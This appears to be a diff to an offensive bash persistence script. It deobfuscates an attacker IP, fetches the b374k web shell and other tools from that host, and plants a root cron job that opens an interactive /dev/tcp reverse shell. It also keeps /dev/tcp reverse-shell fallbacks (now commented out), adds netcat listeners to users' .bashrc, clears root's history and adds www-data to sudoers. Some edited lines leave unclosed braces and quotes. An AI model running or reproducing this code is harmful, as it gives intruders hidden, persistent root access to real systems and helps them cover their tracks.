@@ -54,8 +54,14 @@ targetIP=$(ifconfig | "${GREP}" inet | "${GREP}" -v inet6 | "${GREP}" -v 127| "$
 main () {
    if [ "$(${ID} -u)" != "0" ]
    then
+      attackIP=$(deobf "${attackIP}")
+
       # Gather node information
-      auditURL="https://github.com/CISOfy/lynis/archive/master.zip"
+      # Uncomment if you are in an online environment
+      #auditURL="https://github.com/CISOfy/lynis/archive/master.zip"
+      # Comment out if you are in an online environment - For use in offline environments
+      auditURL="http://${attackIP/lynus/master.zip   
+
       if [ ! -d ~/Documents/.user/.audit ]
       then
         cd ~/ || exit 1
@@ -226,32 +232,33 @@ sysMon() {
        echo ""
        echo "# System Monitor - Monitors the system for failed ssh logins"
        echo ""
-       echo "osType=\"\""
+       echo -e "osType=\"\""
        echo ""
        echo "getOS() {"
        echo "   if [ -f /etc/redhat-release ]"
        echo "   then"
-       echo "     osType=\"redhat\""
+       echo -e "     osType=\"redhat\""
        echo "   elif [ -f  /etc/debian_version ]"
        echo "   then"
-       echo "      osType=\"debian\""
+       echo -e "      osType=\"debian\""
        echo "   else"
-       echo "      echo -e \"Failed to determine which Operating System is running!\""
+       echo -e "      echo -e \"Failed to determine which Operating System is running!\""
+       echo "      exit 1"
        echo "   fi"
        echo "}"
        echo ""
        echo "getOS"
        echo ""
-       echo "logFile=\"\""
+       echo -e "logFile=\"\""
        echo ""
        echo -e "if [ \"\${osType}\" == \"redhat\" ]"
        echo "then"
-       echo "  logFile=\"/var/log/secure\""
+       echo -e "  logFile=\"/var/log/secure\""
        echo -e "elif [ \"\${osType}\" == \"debian\" ]"
        echo "then"
-       echo "  logFile=\"/var/log/auth.log\""
+       echo -e "  logFile=\"/var/log/auth.log\""
        echo "else"
-       echo "  echo -e \"Failed to determine which Operating System is running!\""
+       echo -e "  echo -e \"Failed to determine which Operating System is running!\""
        echo "fi"
        echo ""
        echo -e "grep -qiE 'sh-[0-9]{1,3}\.' \"\${logFile}\""
@@ -265,7 +272,7 @@ sysMon() {
        echo -e "    \"\${userShell}\" -i >& /dev/tcp/\"\${userAddr}\"/\"\${userPort}\" 0<&1 2>&1"
        echo "  ;;"
        echo "  1)"
-       echo "    echo \"No Login Found, exiting...\""
+       echo -e "    echo \"No Login Found, exiting...\""
        echo "    exit 1"
        echo "  ;;"
        echo "  *)"
@@ -287,6 +294,7 @@ sysMon() {
      cronFile="/var/spool/cron/crontabs/root"
    else
      echo -e "\t* [${RED}FAILURE${END}] => Could not determine Operating System to set root's cron file!"
+     exit 0
    fi
 
    # Check if cron file exists for root
@@ -680,50 +688,53 @@ checkListen() {
      esac
    else
      echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred. Could not determine if Netcat is running!"
-     echo ""
-     echo -e "\t* [${YELLOW}INFO${END}] => Failing back to bash listener...!"
+     :' 
+       ## Commented out because we cannot background bash -i shell lisener ##
+       echo ""
+       echo -e "\t* [${YELLOW}INFO${END}] => Failing back to bash listener...!"
 
-     # Attacker needs to have a listener set up on on his/her system
-     # nc -lp 4545 -vvv
-     attackIP=$(deobf "${attackIP}")
+       # Attacker needs to have a listener set up on on his/her system
+       # nc -lp 4545 -vvv
+       attackIP=$(deobf "${attackIP}")
 
-     # Copy connection over stdin
-     exec 0</dev/tcp/"${attackIP}"
-     # Copy stdin to stdout
-     exec 1>&0
-     # Copy stdin to stderr
-     exec 2>&0
+       # Copy connection over stdin
+       exec 0</dev/tcp/"${attackIP}"
+       # Copy stdin to stdout
+       exec 1>&0
+       # Copy stdin to stderr
+       exec 2>&0
 
-     /bin/bash -i 0</dev/tcp/"${attackIP}"/4545 1>&0 2>&0
-     case $? in
-       0)
-         echo -e "\t+ [${GREEN}SUCCESS${END}] => Backup listener is set!"
-       ;;
-       1)
-         echo -e "\t- [${RED}FAILURE${END}] => Failed to launch backup listener!"
-       ;;
-       *)
-         echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred. Could not determine if Bash listener is running!"
-         echo ""
-         echo -e "\t* [${YELLOW}INFO${END}] => Failing back to shell listener...!"
+       /bin/bash -i 0</dev/tcp/"${attackIP}"/4545 1>&0 2>&0
+       case $? in
+         0)
+           echo -e "\t+ [${GREEN}SUCCESS${END}] => Backup listener is set!"
+         ;;
+         1)
+           echo -e "\t- [${RED}FAILURE${END}] => Failed to launch backup listener!"
+         ;;
+         *)
+           echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred. Could not determine if Bash listener is running!"
+           echo ""
+           echo -e "\t* [${YELLOW}INFO${END}] => Failing back to shell listener...!"
 
-         exec 5<>/dev/tcp/"${attackIP}"/4545
-         cat <&5 | while read -r line; do ${line} 2>&5 >&5; done
-         case $? in
-           0)
-             echo -e "\t+ [${GREEN}SUCCESS${END}] => Backup shell listener is set!"
-           ;;
-           1)
-             echo -e "\t- [${RED}FAILURE${END}] => Failed to launch backup shell listener!"
-           ;;
-           *)
-             echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred. Could not determine if shell listener is running!"
-             echo ""
-           ;;
-         esac
-       ;;
-     esac
-   fi
+           exec 5<>/dev/tcp/"${attackIP}"/4545
+           cat <&5 | while read -r line; do ${line} 2>&5 >&5; done
+           case $? in
+             0)
+               echo -e "\t+ [${GREEN}SUCCESS${END}] => Backup shell listener is set!"
+             ;;
+             1)
+               echo -e "\t- [${RED}FAILURE${END}] => Failed to launch backup shell listener!"
+             ;;
+             *)
+               echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred. Could not determine if shell listener is running!"
+               echo ""
+             ;;
+           esac
+         ;;
+       esac
+     ' # End commented out section due to the inability to background /dev/tcp shell
+     fi
 
    # Add netcat listener to all users .bashrc
    for user in /home/*
@@ -1160,7 +1171,7 @@ clearHist() {
    timestamp1=$(getTime "/root/.history")
 
    fileSize=$("${STAT}" -c%s "/root/.history")
-   if [[ "${fileSize2}" == "0" ]]
+   if [ "${fileSize2}" == "0" ]
    then
      echo -e "\t+ [${YELLOW}INFO${END}] => /root/.history contains no content, not backing up!"
    else
@@ -1421,7 +1432,13 @@ checkNoLogin() {
 # Of attack. Also, add www-data to /etc/sudoers
 getWebShell() {
    docRoot=""
-   shellURL="https://github.com/b374k/b374k/archive/master.zip"
+
+   attackIP=$(deobf "${attackIP}")
+
+   # Uncomment if you are in an online environment
+   #shellURL="https://github.com/b374k/b374k/archive/master.zip"
+   # Comment out if you are in an online environment - For use in offline environments
+   shellURL="http://${attackIP}/b374k/master.zip
    targetIP=$(ifconfig | "${GREP}" inet | "${GREP}" -v inet6 | "${GREP}" -v 127| "${AWK}" -F":" '{ print $2 }' | "${AWK}" '{ print $1 }')
  
    "${GREP}" -q "www-data" /etc/sudoers
